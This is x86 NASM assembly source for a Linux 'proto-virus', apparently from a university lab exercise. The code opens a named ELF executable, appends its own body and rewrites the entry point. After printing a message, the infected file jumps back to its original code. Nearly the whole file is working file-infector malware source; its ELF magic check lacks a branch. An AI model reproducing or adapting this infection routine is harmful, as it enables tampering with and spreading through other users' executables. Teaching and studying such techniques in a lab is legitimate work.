%macro	syscall1 2
    mov	ebx, %2
    mov	eax, %1
    int	0x80
%endmacro

%macro	syscall3 4
    mov	edx, %4
    mov	ecx, %3
    mov	ebx, %2
    mov	eax, %1
    int	0x80
%endmacro

%macro  exit 1
    syscall1 1, %1
%endmacro

%macro  write 3
    syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
    syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
    syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
    syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
    syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size    52
%define ELFHDR_phoff	28
%define	vaddr_off	60

%define STDOUT		1
%define FD dword [ebp-4]
%define elf_hdr ebp-56                            ; -4 - headrSize
%define fsize dword [ebp-60]                      ; addres before headr
%define initalEntry ebp-64



    global _start

    section .text
_start:
    push ebp
    mov	ebp, esp
    sub	esp, STK_RES                              ; Set up ebp and reserve space on the stack for local storage
    
    write STDOUT, OutStr, 32                      ;

    ;read_file:                                   ; symbol name
    call get_my_loc_b                             ; get relative string address
    add ebx, FileName                             ; push filename to ebx
    open ebx, RDWR, 0777                          ; open in read/write mode
    mov FD, eax                                   ; save fs of opend file
    cmp FD, -1                                    ; if couldnt open file
    je err                                        ; display error msg and exit

    ; is elf
    read FD, ebp, 4
    mov ecx, ebp
    cmp dword[ecx], 0x464C457F                   ; it is elf if the first bytes match 7f 45 4c ( E L F )
                                                 
    ; get original entry point
    lseek FD, ENTRY, SEEK_SET                     ; store the original entry pint in org_entry
    read FD, org_entry, 4                          

    ; infect file
    lseek FD, 0, SEEK_END                         ; point to the end of the file
    mov esi, eax                                  ; esi = file size
    write FD, virus_start, virus_end-virus_start  ; append this script to a file
                                    
    ; get virtual addres
    lseek FD, vaddr_off, SEEK_SET                 ; point to virtual address in program header
    read FD, ebp, 4                               ; offset = 52+8
    add esi, dword[ecx]                           ; filesize + virtual address
    mov dword[mod_entry], esi                     ; store it in modified entry point  

    ; update entry point
    lseek FD, ENTRY, SEEK_SET                     ; point to the entry point                      
    write FD, mod_entry, 4                        ; write the modified one insted

    ; set previous
    lseek FD, -4, SEEK_END                        ; after executing the virus, go to the
    write FD, org_entry, 4                        ; original entry and execute the real file
    jmp VirusExit                                 ; only then return



virus_start:
    .print_msg:                                   
    call get_my_loc                               ; get relative string address
    add  ecx, OutStr                              ; put the string in ecx
    write STDOUT, ecx, 32                         ; print the string to STDOUT

    call get_my_loc                               ;
    add ecx, PreviousEntryPoint                   
    jmp [ecx]                                     ; execute the original code

VirusExit:
    close FD
    exit 0                                        ; Termination if all is OK and no previous code to jump to
                                                  ; (also an example for use of above macros)

err:
    call get_my_loc
    add  ecx, Failstr
    write STDOUT, ecx, 13
    exit 1

FileName:	db "ELFexec2short", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:	db "perhaps not", 10 , 0



get_my_loc:
    call .next_i
    .next_i:
        pop ecx
        sub ecx, .next_i
        ret

get_my_loc_b:
    call .next_i
    .next_i:
        pop ebx
        sub ebx, .next_i
        ret



PreviousEntryPoint: dd VirusExit
virus_end:

section .bss
org_entry: resd 1
mod_entry: resd 1